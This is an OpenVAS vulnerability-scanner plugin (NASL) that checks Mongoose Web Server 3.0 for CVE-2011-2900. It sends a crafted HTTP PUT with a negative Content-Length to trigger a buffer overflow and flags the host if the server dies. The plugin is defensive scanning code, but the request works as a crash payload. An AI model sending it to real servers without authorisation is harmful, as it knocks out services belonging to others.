###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_mongoose_server_put_req_bof_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# Mongoose Web Server Remote Buffer Overflow Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to execute arbitrary code
  within the context of the affected application. Failed exploit attempts will
  result in a denial-of-service condition.
  Impact Level: System/Application";
tag_affected = "Mongoose Web Server version 3.0";
tag_insight = "The flaw is due to an error in the 'put_dir()' function (mongoose.c)
  when processing HTTP PUT web requests. This can be exploited to cause an
  assertion error or a stack-based buffer overflow.";
tag_solution = "No solution or patch is available as of 11th august, 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://code.google.com/p/mongoose/";
tag_summary = "The host is running Mongoose Web Server and is prone to remote
  buffer overflow vulnerability.";

if(description)
{
  script_id(802139);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-09-07 08:36:57 +0200 (Wed, 07 Sep 2011)");
  script_cve_id("CVE-2011-2900");
  script_bugtraq_id(48980);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_name("Mongoose Web Server Remote Buffer Overflow Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secunia.com/advisories/45464");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/68991");
  script_xref(name : "URL" , value : "http://www.openwall.com/lists/oss-security/2011/08/03/5");

  script_description(desc);
  script_summary("Check if Mongoose Web Serveris vulnerable to BOF");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
  script_family("Web Servers");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 80, 8080);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Get the port
port = get_http_port(default:8080);
if(!get_port_state(port)){
  exit(0);
}

## Get the banner
banner = get_http_banner(port:port);
if(!banner || "Server:" >< banner){
  exit(0);
}

if(http_is_dead(port:port))exit(0);

## Construct attack request
req = string('PUT /exp/put.cgi HTTP/1.1\r\n',
             'Host: ', get_host_name(), '\r\n',
             'Content-Length: -2147483648\r\n\r\n');

## Send crafted Request
res = http_send_recv(port:port, data:req);
res = http_send_recv(port:port, data:req);

## Confirm  exploit worked by checking port state
if(http_is_dead(port:port)){
  security_hole(port);
}
